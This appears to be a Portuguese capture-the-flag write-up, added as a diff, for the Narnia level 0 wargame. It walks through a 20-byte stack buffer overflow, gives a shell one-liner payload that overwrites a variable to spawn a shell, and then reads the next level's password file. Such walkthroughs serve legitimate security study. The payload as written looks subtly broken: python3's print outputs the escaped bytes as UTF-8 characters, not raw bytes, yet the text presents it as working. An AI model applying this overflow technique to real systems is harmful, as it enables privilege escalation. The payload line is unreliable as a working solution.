@@ -1,0 +1,236 @@
+Narnia 0 → Narnia 1
+
+1. Entrando no diretório do desafio
+
+Depois de acessar o nível "narnia0", fui até o diretório onde ficam os arquivos dos desafios:
+
+cd /narnia
+
+Em seguida, listei os arquivos disponíveis:
+
+ls
+
+Entre eles estavam:
+
+narnia0
+narnia0.c
+narnia1
+narnia1.c
+...
+
+O Narnia disponibiliza o código-fonte de cada nível justamente para facilitar a identificação das vulnerabilidades.
+
+---
+
+2. Identificando o arquivo "narnia0.c"
+
+Antes de abrir o arquivo, utilizei o comando "file" para verificar que tipo de arquivo era:
+
+file narnia0.c
+
+O resultado identifica "narnia0.c" como um arquivo de código-fonte C/texto ASCII.
+
+Essa etapa serviu para confirmar o tipo do arquivo antes de analisar seu conteúdo.
+
+---
+
+3. Lendo o código-fonte
+
+Depois disso, usei:
+
+cat narnia0.c
+
+O código relevante é:
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(){
+    long val=0x41414141;
+    char buf[20];
+
+    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
+    printf("Here is your chance: ");
+    scanf("%24s",&buf);
+
+    printf("buf: %s\n",buf);
+    printf("val: 0x%08x\n",val);
+
+    if(val==0xdeadbeef){
+        setreuid(geteuid(),geteuid());
+        system("/bin/sh");
+    }
+    else {
+        printf("WAY OFF!!!!\n");
+        exit(1);
+    }
+
+    return 0;
+}
+
+Esse é o ponto principal do desafio: "val" começa como "0x41414141", enquanto o programa exige que ele seja alterado para "0xdeadbeef".
+
+---
+
+4. Identificando a vulnerabilidade
+
+O código cria um buffer de apenas 20 bytes:
+
+char buf[20];
+
+Porém, logo depois utiliza:
+
+scanf("%24s",&buf);
+
+Ou seja, existe espaço para escrever além dos 20 bytes reservados para "buf".
+
+Os write-ups do desafio identificam isso como um buffer overflow, permitindo que os bytes excedentes sobrescrevam o valor de "val".
+
+A ideia é então preencher os 20 bytes do "buf" e utilizar os 4 bytes seguintes para alterar "val".
+
+---
+
+5. Preparando o valor "0xdeadbeef"
+
+O valor que queremos colocar em "val" é:
+
+0xdeadbeef
+
+Como os dados precisam ser escritos em little-endian, a sequência de bytes utilizada é:
+
+ef be ad de
+
+Em Python:
+
+\xef\xbe\xad\xde
+
+Assim, o payload é formado por:
+
+20 bytes de preenchimento
++
+4 bytes de 0xdeadbeef
+
+Ou seja:
+
+AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde
+
+Esse mesmo formato é documentado em outros write-ups do Narnia 0.
+
+---
+
+6. Executando o payload
+
+Usei:
+
+(python3 -c "print('A'*20 + '\xef\xbe\xad\xde')"; cat) | ./narnia0
+
+Os primeiros 20 caracteres preenchem o buffer:
+
+AAAAAAAAAAAAAAAAAAAA
+
+e os quatro bytes seguintes sobrescrevem "val" com:
+
+0xdeadbeef
+
+A saída deve indicar:
+
+val: 0xdeadbeef
+
+Nesse momento, a condição:
+
+if(val==0xdeadbeef)
+
+é satisfeita.
+
+---
+
+7. Obtendo o shell
+
+Quando a condição é verdadeira, o código executa:
+
+setreuid(geteuid(),geteuid());
+system("/bin/sh");
+
+Assim, o programa abre um shell com as permissões efetivas do próximo nível.
+
+O "cat" colocado depois do comando Python serve para manter a entrada padrão disponível para continuar interagindo com o shell depois que ele for aberto. Write-ups do desafio utilizam essa mesma construção.
+
+---
+
+8. Confirmando o usuário
+
+Com o shell aberto, é possível verificar o usuário atual:
+
+whoami
+
+O resultado esperado é:
+
+narnia1
+
+Isso confirma que o shell está sendo executado no contexto do próximo nível.
+
+---
+
+9. Capturando a credencial do próximo nível
+
+As credenciais dos níveis ficam em:
+
+/etc/narnia_pass/
+
+Então, para concluir o nível:
+
+cat /etc/narnia_pass/narnia1
+
+Esse comando retorna a credencial necessária para acessar o "narnia1".
+
+A senha real não foi colocada aqui para não publicar a credencial do desafio.
+
+---
+
+10. Resumo
+
+O processo que realizei foi:
+
+cd /narnia
+        ↓
+ls
+        ↓
+file narnia0.c
+        ↓
+cat narnia0.c
+        ↓
+Identificação do buffer de 20 bytes
+        ↓
+Identificação do scanf permitindo 24 bytes
+        ↓
+Preparação do valor 0xdeadbeef
+        ↓
+Payload com 20 bytes + ef be ad de
+        ↓
+val = 0xdeadbeef
+        ↓
+system("/bin/sh")
+        ↓
+whoami → narnia1
+        ↓
+cat /etc/narnia_pass/narnia1
+
+Payload utilizado
+
+(python3 -c "print('A'*20 + '\xef\xbe\xad\xde')"; cat) | ./narnia0
+
+Vulnerabilidade explorada
+
+Buffer overflow
+
+Offset
+
+20 bytes
+
+Valor desejado
+
+0xdeadbeef
+
+Ordem dos bytes
+
+ef be ad de
